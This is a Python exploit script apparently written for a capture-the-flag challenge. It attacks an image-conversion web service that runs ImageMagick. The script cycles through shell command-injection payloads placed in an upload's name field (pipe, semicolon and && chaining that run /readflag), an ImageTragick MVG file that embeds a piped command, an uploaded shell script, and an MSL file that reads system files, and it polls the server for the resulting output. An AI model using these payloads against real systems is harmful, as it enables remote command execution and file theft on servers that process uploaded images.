#!/usr/bin/env python3
"""
Magik - Comprehensive Bypass Exploit

Bypasses:
1. URL-encoded colon (%3A)
2. Pipe delegate (|)
3. ImageTragick MVG
4. Shell command injection via delegates
"""

import requests
import time
import base64

URL = "https://aa1fadfd635d-magik.challs.m0lecon.it/"

# Create a valid PNG
png = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg==')

def test_url_encoded_pipe():
    """Test URL-encoded pipe bypass"""
    print("\n[*] Attempt 1: URL-encoded pipe (|) - %257C")

    # name = |/readflag > static/pwn.png
    # URL-encoded: %257C/readflag%20%3E%20static/pwn.png

    # But we need to inject into the convert command
    # The name goes into: static/<name>.png
    # So we need: dummy.png |/readflag>static/flag /app/out

    payloads = [
        "dummy.png %257C/readflag%3Estatic/flag /app/out",
        "dummy.png %7C/readflag%3Estatic/flag /app/out",
        "x.png %7C/readflag /app/flag",
        "x.png %257C/readflag /app/flag",
    ]

    for payload in payloads:
        print(f"  Trying: {payload}")
        try:
            r = requests.post(URL,
                files={'img': ('test.png', png, 'application/octet-stream')},
                data={'name': payload},
                timeout=5)
            print(f"    Upload: {r.status_code}")

            time.sleep(2)

            # Try to retrieve
            for fname in ['flag.png', 'flag', 'out.png', 'pwn.png']:
                r2 = requests.get(f"{URL}static/{fname}", timeout=3)
                if r2.status_code == 200:
                    print(f"    [+] Found {fname}!")
                    print(f"    Content: {r2.text[:200]}")
                    if 'ptm{' in r2.text:
                        print(f"\n[!!!] FLAG: {r2.text}")
                        return True
        except Exception as e:
            print(f"    Error: {e}")

    return False

def test_imagetragick_mvg():
    """Test ImageTragick MVG bypass"""
    print("\n[*] Attempt 2: ImageTragick MVG with pipe")

    # Create MVG payload
    mvg = b'''push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 '|/readflag > /app/mvgflag.txt'
pop graphic-context'''

    payloads = [
        "dummy.png /app/mvgout",
        "x /app/mvgtest",
    ]

    for payload in payloads:
        print(f"  Trying MVG with name: {payload}")
        try:
            r = requests.post(URL,
                files={'img': ('exploit.mvg', mvg, 'application/octet-stream')},
                data={'name': payload},
                timeout=5)
            print(f"    Upload: {r.status_code}")

            time.sleep(3)

            # Check outputs
            for fname in ['mvgflag.txt', 'mvgout.png', 'mvgtest.png']:
                r2 = requests.get(f"{URL}{fname}", timeout=3)
                if r2.status_code == 200:
                    print(f"    [+] Found {fname}!")
                    print(f"    Content: {r2.text[:200]}")
                    if 'ptm{' in r2.text:
                        print(f"\n[!!!] FLAG: {r2.text}")
                        return True
        except Exception as e:
            print(f"    Error: {e}")

    return False

def test_direct_pipe():
    """Test direct pipe without encoding"""
    print("\n[*] Attempt 3: Direct pipe injection")

    # Since convert.sh uses: convert $1 ... static/$2.png
    # We inject: dummy.png |/readflag>/app/flag /app/out
    # Result: convert /tmp/phpXXX ... static/dummy.png |/readflag>/app/flag /app/out.png

    payloads = [
        "x.png |/readflag>/app/pipeflag /app/out",
        "x.png |/readflag /app/pipeflag",
        "x.png |sh -c /readflag>/app/shflag /app/out",
    ]

    for payload in payloads:
        print(f"  Trying: {payload}")
        try:
            r = requests.post(URL,
                files={'img': ('test.png', png, 'application/octet-stream')},
                data={'name': payload},
                timeout=5)
            print(f"    Upload: {r.status_code}")

            time.sleep(2)

            # Check outputs
            for fname in ['pipeflag', 'pipeflag.png', 'shflag', 'out.png']:
                r2 = requests.get(f"{URL}{fname}", timeout=3)
                if r2.status_code == 200:
                    print(f"    [+] Found {fname}!")
                    print(f"    Content: {r2.text[:200]}")
                    if 'ptm{' in r2.text:
                        print(f"\n[!!!] FLAG: {r2.text}")
                        return True
        except Exception as e:
            print(f"    Error: {e}")

    return False

def test_semicolon_injection():
    """Test semicolon command injection"""
    print("\n[*] Attempt 4: Semicolon injection")

    # name = x.png; /readflag > /app/semiflag; /app/out

    payloads = [
        "x.png; /readflag > /app/semiflag; /app/out",
        "x.png;/readflag>/app/semiflag;/app/out",
        "x.png && /readflag > /app/andflag && /app/out",
    ]

    for payload in payloads:
        print(f"  Trying: {payload}")
        try:
            r = requests.post(URL,
                files={'img': ('test.png', png, 'application/octet-stream')},
                data={'name': payload},
                timeout=5)
            print(f"    Upload: {r.status_code}")

            time.sleep(2)

            for fname in ['semiflag', 'andflag']:
                r2 = requests.get(f"{URL}{fname}", timeout=3)
                if r2.status_code == 200:
                    print(f"    [+] Found {fname}!")
                    print(f"    Content: {r2.text[:200]}")
                    if 'ptm{' in r2.text:
                        print(f"\n[!!!] FLAG: {r2.text}")
                        return True
        except Exception as e:
            print(f"    Error: {e}")

    return False

def test_write_script():
    """Test writing a shell script to /app/ then executing"""
    print("\n[*] Attempt 5: Write script to /app/")

    # First upload: write script
    script = b'#!/bin/sh\n/readflag > /app/scriptflag.txt\n'

    print("  [5.1] Writing script...")
    try:
        r = requests.post(URL,
            files={'img': ('script.sh', script, 'application/octet-stream')},
            data={'name': 'x.png /app/run'},
            timeout=5)
        print(f"    Upload: {r.status_code}")

        time.sleep(1)

        # Try to execute it (won't work directly, but maybe chmod works?)
        print("  [5.2] Trying to execute script...")

        # Use convert to create a file that when processed, executes script
        # This probably won't work but worth trying

        r2 = requests.post(URL,
            files={'img': ('dummy.png', png, 'application/octet-stream')},
            data={'name': 'x.png /app/run.sh /app/out'},
            timeout=5)
        print(f"    Exec attempt: {r2.status_code}")

        time.sleep(2)

        r3 = requests.get(f"{URL}scriptflag.txt", timeout=3)
        if r3.status_code == 200:
            print(f"    [+] Script executed!")
            print(f"    FLAG: {r3.text}")
            return True

    except Exception as e:
        print(f"    Error: {e}")

    return False

def test_msl_without_colon():
    """Try MSL file with alternate invocation"""
    print("\n[*] Attempt 6: MSL without colon protocol")

    # Create MSL that reads flag
    msl = b'''<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="/etc/hostname" />
<write filename="/app/msltest.png" />
</image>'''

    print("  [6.1] Uploading MSL file...")
    try:
        r = requests.post(URL,
            files={'img': ('payload.msl', msl, 'application/octet-stream')},
            data={'name': 'x.png /app/msl'},
            timeout=5)
        print(f"    Upload: {r.status_code}")

        time.sleep(2)

        # Check if processed
        r2 = requests.get(f"{URL}msltest.png", timeout=3)
        if r2.status_code == 200:
            print(f"    [+] MSL processed!")
            print(f"    Size: {len(r2.content)}")

    except Exception as e:
        print(f"    Error: {e}")

    return False

def main():
    print(f"[*] Target: {URL}")
    print("[*] Testing various bypass techniques...")

    techniques = [
        test_direct_pipe,
        test_semicolon_injection,
        test_url_encoded_pipe,
        test_imagetragick_mvg,
        test_write_script,
        test_msl_without_colon,
    ]

    for technique in techniques:
        if technique():
            print(f"\n[+] SUCCESS with {technique.__name__}!")
            return

    print("\n[-] All bypass attempts failed")
    print("[*] The challenge may require:")
    print("    - A specific ImageMagick version vulnerability")
    print("    - A different delegate/coder exploitation")
    print("    - Understanding of the exact filter implementation")

if __name__ == "__main__":
    main()
